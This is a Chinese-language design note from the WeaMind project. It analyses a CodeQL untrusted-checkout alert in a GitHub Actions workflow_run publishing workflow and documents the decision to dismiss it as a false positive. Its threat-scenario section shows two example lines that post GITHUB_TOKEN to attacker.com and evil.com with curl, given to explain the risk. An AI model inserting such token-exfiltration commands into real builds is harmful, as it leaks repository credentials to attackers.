# Workflow Run 安全警告處理：False Positive 分析

## 問題來源

https://github.com/kyomind/WeaMind/security/code-scanning/51

**CodeQL Alert #51**：
- **規則**：`actions/untrusted-checkout/medium`
- **嚴重性**：Warning (Medium)
- **位置**：`.github/workflows/publish-ghcr.yml` (Line 24-31)
- **描述**：Potential unsafe checkout of untrusted pull request on privileged workflow

## 問題本質

### workflow_run 觸發器的安全風險

`workflow_run` 觸發器會在**特權環境**中執行，具有：
- 對 `secrets.GITHUB_TOKEN` 的完整訪問權限
- 可寫入 repository（如果有 `contents: write` 權限）
- 可推送到 GHCR（如果有 `packages: write` 權限）

**潛在攻擊場景**：
如果在特權 workflow 中 checkout 來自 Pull Request 的程式碼並執行，攻擊者可以：

1. **修改 Dockerfile**：
   ```dockerfile
   # 惡意注入
   RUN curl -X POST https://attacker.com/steal \
       -d "token=$GITHUB_TOKEN"
   ```

2. **修改 build scripts**：
   ```bash
   # 在 package.json 或 Makefile 中
   echo $GITHUB_TOKEN | curl -X POST https://evil.com
   ```

3. **推送惡意 image**：
   - 竊取環境變數
   - 植入後門
   - 破壞生產環境

## CodeQL 建議的解決方式：兩階段模式

### 階段 1：不受信任環境（`pull_request` 觸發）

```yaml
name: Receive PR
on: pull_request

jobs:
  build:
    runs-on: ubuntu-latest
    # 沒有 secrets，沒有 write 權限
    steps:
      - uses: actions/checkout@v6

      - name: Build and test
        run: |
          # 執行 PR 的程式碼，但在隔離環境
          npm install
          npm test

      - name: Save results
        run: |
          mkdir -p ./results
          echo "Test passed" > ./results/status.txt

      - uses: actions/upload-artifact@v4
        with:
          name: test-results
          path: results/
```

### 階段 2：特權環境（`workflow_run` 觸發）

```yaml
name: Publish on success
on:
  workflow_run:
    workflows: ["Receive PR"]
    types: [completed]

jobs:
  publish:
    runs-on: ubuntu-latest
    if: github.event.workflow_run.conclusion == 'success'

    permissions:
      packages: write

    steps:
      # 只下載 artifacts，不 checkout PR 程式碼
      - name: Download artifacts
        uses: actions/download-artifact@v4

      # 使用 base branch 的程式碼進行部署
      - uses: actions/checkout@v6
        with:
          ref: main  # 固定使用 main 分支

      - name: Publish
        run: |
          # 使用可信任的程式碼進行發布
          docker build -t image:latest .
          docker push image:latest
```

**安全原則**：
- ✅ 不受信任的程式碼在無特權環境執行
- ✅ 特權環境只執行受信任的程式碼
- ✅ 通過 artifacts 傳遞結果（而非執行 PR 程式碼）

## WeaMind 採用的解決方式：條件過濾

WeaMind 沒有採用兩階段模式，而是使用 **if 條件嚴格過濾**：

```yaml
name: Publish to GHCR
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
    branches: [main]

permissions:
  contents: read
  packages: write

jobs:
  build-and-push:
    # 關鍵防護：多重條件過濾
    if: ${{
      github.event.workflow_run.conclusion == 'success' &&
      github.event.workflow_run.event == 'push' &&
      github.event.workflow_run.head_branch == 'main'
    }}
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v6
        with:
          ref: ${{ github.event.workflow_run.head_sha }}

      - name: Build and push
        # ... 推送 Docker image
```

### 安全機制分析

**三重防護**：

1. **`event == 'push'`**：
   - 只處理 push 事件
   - **拒絕所有 Pull Request**（PR 的 event 是 `pull_request`）
   - 這是核心防護

2. **`head_branch == 'main'`**：
   - 只處理 main 分支
   - 即使是 push，也必須是 main 分支
   - 排除其他分支的 push

3. **`conclusion == 'success'`**：
   - CI 必須成功通過
   - 確保程式碼已經過完整驗證（lint, test, security scan）

### 為什麼這樣也安全？

```bash
攻擊者嘗試：提交 PR with 惡意 Dockerfile
↓
CI workflow 執行（在 pull_request 環境，無特權）
↓
publish-ghcr.yml 檢查條件
↓
event == 'pull_request' ✗（不是 'push'）
↓
Workflow 終止，不執行任何步驟
↓
攻擊失敗 ✅
```

**只有以下場景會執行**：
```bash
開發者 push to main
↓
CI workflow 執行（event: push, branch: main）
↓
CI 成功
↓
publish-ghcr.yml 檢查條件
↓
✓ event == 'push'
✓ branch == 'main'
✓ conclusion == 'success'
↓
Checkout main 的程式碼（受信任）
↓
Build and push image ✅
```

## 為什麼 CodeQL 仍然警告？

### 靜態分析的限制

CodeQL 進行**靜態程式碼分析**，它的檢測邏輯：

1. ✓ 偵測到 `workflow_run` 觸發器
2. ✓ 偵測到 `actions/checkout` 步驟
3. ✓ 偵測到使用 `github.event.workflow_run.head_sha`
4. ✗ 無法理解 `if` 條件的邏輯語義

**CodeQL 無法推理**：
- 不知道 `event == 'push'` 會排除 PR
- 不知道 `head_branch == 'main'` 確保分支安全
- 無法驗證運行時的條件邏輯

**結果**：基於保守原則，發出警告。

### 類似情況

這類似於：
```python
# CodeQL 會警告 "可能的空指針"
def process(data):
    if data is not None:
        return data.upper()  # 實際上安全，但靜態分析無法確定
```

雖然邏輯上安全，但靜態分析工具無法完全理解執行流程。

## 處理建議

### ⚠️ 不要採用的方案：GitHub Copilot Autofix 建議

GitHub UI 上的 Copilot Autofix 功能可能會建議將：

```yaml
# 原始實現（正確）
ref: ${{ github.event.workflow_run.head_sha }}
```

改為：

```yaml
# Copilot 建議（錯誤）
ref: main
```

**❌ 這個建議不應該採用**，理由如下：

#### 問題 1：失去版本一致性

**原始設計的運作流程**：
```
T1: Push commit abc123 to main
T2: CI workflow 驗證 commit abc123（lint, test, security scan）
T3: CI 成功
T4: publish-ghcr.yml 觸發，checkout commit abc123
T5: Build & Push image（image 內容 = 已驗證的 abc123）
✅ 版本一致性：CI 驗證什麼，就 build 什麼
```

**採用 Copilot 建議後的問題**：
```
T1: Push commit abc123 to main
T2: CI workflow 驗證 commit abc123
T3: 你又 push commit def456 to main（開發其他功能）
T4: abc123 的 CI 成功
T5: publish-ghcr.yml 觸發，checkout main（現在指向 def456）
T6: Build & Push image（image 內容 = 未經 CI 驗證的 def456）
❌ 嚴重問題：推送了未經驗證的程式碼！
```

#### 問題 2：競態條件（Race Condition）

在快速連續 push 的場景下：

```
開發者操作：
- 10:00:00 → push commit A
- 10:00:30 → push commit B
- 10:01:00 → push commit C

CI 執行順序：
- 10:00:05 → CI for A 開始
- 10:00:35 → CI for B 開始
- 10:01:05 → CI for C 開始

publish-ghcr.yml 執行：
- 10:02:00 → A 的 CI 成功，觸發 publish
  - checkout main（現在是 commit C）
  - 推送 image tag: sha-A（內容卻是 C）❌

- 10:02:30 → B 的 CI 成功，觸發 publish
  - checkout main（現在是 commit C）
  - 推送 image tag: sha-B（內容卻是 C）❌

- 10:03:00 → C 的 CI 成功，觸發 publish
  - checkout main（現在是 commit C）
  - 推送 image tag: sha-C（內容是 C）✓
```

**結果**：`sha-A` 和 `sha-B` 的 tag 都指向 commit C 的內容，完全混亂！

#### 問題 3：語義錯誤與可追溯性破壞

```bash
# image tag 的語義承諾
ghcr.io/kyomind/weamind:sha-abc123
# 預期：這個 image 包含 commit abc123 的程式碼

# 使用 ref: main 後的實際情況
# 實際：這個 image 可能包含任何 commit 的程式碼（取決於執行時 main 指向哪裡）

# 這會導致：
- 回滾失敗：拉取 sha-abc123 期望回到 abc123 狀態，實際上是其他版本
- Debug 困難：無法確定特定 image 的實際內容
- 信任崩潰：tag 名稱失去意義
```

#### 為什麼 Copilot 會提出這個建議？

1. **靜態分析局限**：Copilot 看到「使用 `head_sha` 可能不安全」，建議用固定的 `main`
2. **只解決表面問題**：這確實能消除 CodeQL 警告（因為不再使用動態 SHA）
3. **未考慮業務邏輯**：沒有理解版本一致性的重要性

#### 正確的做法

**保持原始實現**：
```yaml
ref: ${{ github.event.workflow_run.head_sha }}
```

這是安全的，因為：
- ✅ `if` 條件已經排除了 PR（`event == 'push'`）
- ✅ 只處理 main 分支（`head_branch == 'main'`）
- ✅ 確保版本一致性（CI 驗證的就是 build 的）

**消除警告的方式**：關閉為 False Positive（見下方選項 1）

### 選項 1：關閉為 False Positive ✅ **推薦**

在 GitHub Security → Code scanning alerts → Alert #51：

**關閉理由**：
```bash
False Positive: Workflow has explicit guards to prevent PR execution.

Security measures:
1. `event == 'push'` - Rejects all pull_request events
2. `head_branch == 'main'` - Only processes main branch
3. `conclusion == 'success'` - Requires CI validation

The checkout is safe as it only runs for trusted main branch commits.
Using head_sha ensures version consistency between CI validation and image build.
```

**Dismiss as**：`Won't fix` 或 `False positive`

### 選項 2：採用兩階段模式

如果希望完全消除警告，可以重構為兩階段模式（如 CodeQL 建議）：

**優點**：
- ✅ CodeQL 不會再警告
- ✅ 符合業界最佳實踐
- ✅ 更清晰的安全隔離

**缺點**：
- ✗ 增加 workflow 複雜度
- ✗ 需要額外的 artifact 管理
- ✗ 對個人專案可能過度設計

### 選項 3：添加 CodeQL 抑制註解

在 workflow 中添加註解告訴 CodeQL 這是安全的：

```yaml
jobs:
  build-and-push:
    # codeql[actions/untrusted-checkout]: Safe due to explicit event filtering
    if: ${{ github.event.workflow_run.event == 'push' && ... }}
```

（注意：此語法可能不被 GitHub CodeQL 支援，僅為示意）

## 最終決策

**採用選項 1**：關閉為 False Positive

**理由**：
1. **實際安全性充分**：三重條件過濾已經提供足夠保護
2. **簡潔優先**：個人專案不需要過度複雜的架構
3. **維護成本**：兩階段模式增加維護負擔
4. **團隊規模**：個人專案，所有 push to main 都是可信任的

## 關鍵學習

### 何時需要兩階段模式？

✅ **需要採用**：
- 開源專案，接受外部貢獻者 PR
- 多人協作，需要嚴格權限隔離
- 企業環境，合規要求
- PR 需要執行不受信任的程式碼（如 build scripts）

✅ **可以使用條件過濾**：
- 個人專案，PR 數量少且可手動審查
- 團隊小且成員可信
- CI 已有完整的安全掃描
- main 分支有嚴格的保護規則

### 安全清單

無論採用哪種方式，都應確保：

- ☑ 最小權限原則（`permissions:` 只給必要權限）
- ☑ 分支保護規則（main 需要 PR review）
- ☑ CI 包含安全掃描（Bandit, pip-audit 等）
- ☑ Secrets 最小化暴露
- ☑ 定期審查 workflow 權限

## 參考資料

- [GitHub Security Lab: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [GitHub Actions: workflow_run event](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run)
- [CodeQL: Untrusted checkout rule](https://codeql.github.com/codeql-query-help/actions/actions-untrusted-checkout/)
- WeaMind workflows: [publish-ghcr.yml](../../.github/workflows/publish-ghcr.yml)

---

**決策日期**：2026-01-13
**Alert #51 狀態**：Dismissed as False Positive
**討論參與者**：kyomind, GitHub Copilot
